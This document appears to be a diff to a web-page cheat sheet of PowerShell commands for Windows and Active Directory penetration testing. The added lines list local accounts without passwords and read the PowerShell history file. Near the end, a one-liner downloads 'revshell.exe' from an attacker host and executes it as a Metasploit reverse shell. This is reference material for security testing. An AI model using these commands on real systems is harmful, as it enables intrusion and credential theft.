@@ -572,6 +572,12 @@ remote registry on the target)(<code>PowerView</code>):</p>
 <span class="c"># AD Module</span>
 <span class="p">(</span><span class="nb">Get-ADForest</span><span class="p">).</span><span class="n">GlobalCatalogs</span> 
 </code></pre></div>
+<p>Get all local users that haven't password:</p>
+<div class="highlight"><pre><span></span><code><span class="nb">Get-WmiObject</span> <span class="n">-Class</span> <span class="n">Win32_UserAccount</span> <span class="n">-Filter</span> <span class="s2">"LocalAccount=True"</span> <span class="p">|</span> <span class="nb">Select </span><span class="n">Name</span><span class="p">,</span> <span class="n">PasswordRequired</span> <span class="p">|</span> <span class="nb">where </span><span class="n">-Property</span> <span class="n">PasswordRequired</span> <span class="o">-NE</span> <span class="n">True</span>
+</code></pre></div>
+<p>Get PowerShell history:</p>
+<div class="highlight"><pre><span></span><code><span class="nb">Get-Content</span> <span class="nv">$env:USERPROFILE</span><span class="p">\</span><span class="n">AppData</span><span class="p">\</span><span class="n">Roaming</span><span class="p">\</span><span class="n">Microsoft</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">PowerShell</span><span class="p">\</span><span class="n">PSReadline</span><span class="p">\</span><span class="n">ConsoleHost_history</span><span class="p">.</span><span class="n">txt</span>
+</code></pre></div>
 <h4 id="using-net-classes">Using .NET classes</h4>
 <p>Use .NET classes to enumerate domains:</p>
 <div class="highlight"><pre><span></span><code><span class="nv">$ADClass</span> <span class="p">=</span> <span class="no">[System.DirectoryServices.ActiveDirectory.Domain]</span>
@@ -1742,7 +1748,11 @@ log<span class="w"> </span>&lt;log<span class="w"> </span>file<span class="w"> <
 <p>Get Windows Event object:</p>
 <div class="highlight"><pre><span></span><code><span class="nb">Get-WinEvent</span> <span class="n">-FilterHashtable</span> <span class="p">@{</span><span class="n">Logname</span><span class="p">=&lt;</span><span class="n">event</span> <span class="n">type</span><span class="p">&gt;,</span><span class="n">ID</span><span class="p">=&lt;</span><span class="n">event</span> <span class="n">ID</span><span class="p">&gt;}</span> <span class="n">-MaxEvents</span> <span class="n">1</span> <span class="p">|</span> <span class="nb">Format-List</span> <span class="n">-Property</span> <span class="p">*</span>
 </code></pre></div>
-<p>Note: event type is generally 'Security'</p>
+<p><strong>Note</strong>: event type is generally 'Security'</p>
+<p>Download reverse shell for a Metasploit listener:</p>
+<div class="highlight"><pre><span></span><code><span class="n">powershell</span> <span class="n">-c</span> <span class="s2">"(New-Object System.Net.WebClient).Downloadfile('[http://10.9.6.99:8099/revshell.exe',](http://10.9.6.99:8099/revshell.exe',) 'revshell.exe') ; Start-Process revshell.exe -Wait"</span>
+</code></pre></div>
+<p><strong>Note</strong>: <code>Start Process</code> is launched with the <code>-Wait</code> option since otherwise session could be immediately closed.</p>
   </div>
   <div class="tag-cloud">
     <p>
